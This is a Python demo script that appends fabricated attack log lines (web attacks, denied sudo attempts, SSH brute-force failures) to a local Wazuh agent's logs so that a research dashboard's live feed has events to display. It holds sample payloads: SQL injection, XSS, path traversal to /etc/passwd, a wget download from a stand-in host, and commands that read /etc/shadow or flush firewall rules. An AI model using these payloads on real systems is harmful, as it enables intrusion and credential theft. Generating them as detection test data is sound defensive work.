"""
experiments/evaluation/wazuh_integration/live_demo_loop.py

Not part of the evaluation dataset -- this exists purely so the dashboard's
Live Feed tab (dashboard/app.py) has something new to show up while
demoing/recording it, without needing to manually trigger activity at the
exact moment. Fires one fresh, varied, real alert into the local Wazuh
agent's monitored logs every ~45 seconds, rotating across the established
trigger types (web-attack, sudo, SSH brute-force) -- the exact same
mechanism already used for the real n~150 dataset
(experiments/evaluation/wazuh_integration/), just a slow drip instead of a
one-shot bulk fire.

Each fired line is guaranteed unique (fresh random IP/timestamp/payload
each time) so it survives the dashboard's (rule.id, full_log) dedup and
actually shows up as "new" on the next poll.

Deliberately NOT meant to grow the citable n=150 dataset further --
re-running experiments/evaluation/wazuh_integration_test.py while this is
running would pull in whatever this loop has added since the last run,
which is fine for demo purposes but would make the paper's reported n
a moving target if relied on for real numbers. Stop this before taking
anything from the live set as a citable result.

Usage:
    python -m experiments.evaluation.wazuh_integration.live_demo_loop
    (Ctrl+C to stop, or just kill the process)
"""

import random
import subprocess
import time
from datetime import datetime, timezone

CONTAINER = "wazuh-agent-wazuh.agent-1"
INTERVAL_SECONDS = 45

USERNAMES = ["admin", "root", "oracle", "deploy", "backup", "test", "jenkins", "svc-app"]
COMMANDS = ["/bin/bash", "/usr/sbin/useradd shadowacct", "/usr/bin/passwd root",
            "/sbin/iptables -F", "/bin/cat /etc/shadow"]
WEB_PAYLOADS = [
    "/product.php?id={n}%20union%20select%201,2,3--",
    "/comment.php?text=%3Cscript%3Ealert({n})%3C%2Fscript%3E",
    "/download.php?file=../../../../etc/passwd?t={n}",
    "/status.php?cmd=wget%20http://evil.example/x{n}.sh",
    "/search.php?q=admin%27%20or%20%27{n}%27=%27{n}",
]


def _docker_exec(cmd: str):
    subprocess.run(["docker", "exec", CONTAINER, "sh", "-c", cmd], check=False,
                    capture_output=True)


def _now_syslog():
    return datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")


def fire_web_attack():
    n = random.randint(10000, 99999)
    ip = f"203.0.113.{random.randint(150, 250)}"
    path = random.choice(WEB_PAYLOADS).format(n=n)
    ts = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{ts}] "GET {path} HTTP/1.1" 200 {random.randint(80,900)} "-" "curl/7.88.1"'
    _docker_exec(f"echo '{line}' >> /var/log/web_bait/access.log")
    return f"web-attack from {ip}"


def fire_sudo():
    user = random.choice(USERNAMES)
    cmd = random.choice(COMMANDS)
    tty = f"pts/{random.randint(0,9)}"
    line = f"{_now_syslog()} soc-guardrails-agent-01 sudo:   {user} : user NOT in sudoers ; TTY={tty} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"
    _docker_exec(f"echo '{line}' >> /var/log/secure")
    return f"sudo attempt by {user}"


def fire_ssh():
    user = random.choice(USERNAMES)
    ip = f"198.51.100.{random.randint(30, 90)}"
    port = random.randint(40000, 65000)
    pid = random.randint(2000, 9000)
    line = f"{_now_syslog()} soc-guardrails-agent-01 sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2"
    _docker_exec(f"echo '{line}' >> /var/log/secure")
    return f"SSH failed login from {ip}"


TRIGGERS = [fire_web_attack, fire_sudo, fire_ssh]


def run():
    print(f"Live demo loop started -- firing one alert every {INTERVAL_SECONDS}s. Ctrl+C to stop.")
    print("This does NOT feed the citable n~150 dataset -- demo purposes only.\n")
    while True:
        trigger = random.choice(TRIGGERS)
        desc = trigger()
        print(f"[{time.strftime('%H:%M:%S')}] fired: {desc}")
        time.sleep(INTERVAL_SECONDS)


if __name__ == "__main__":
    run()
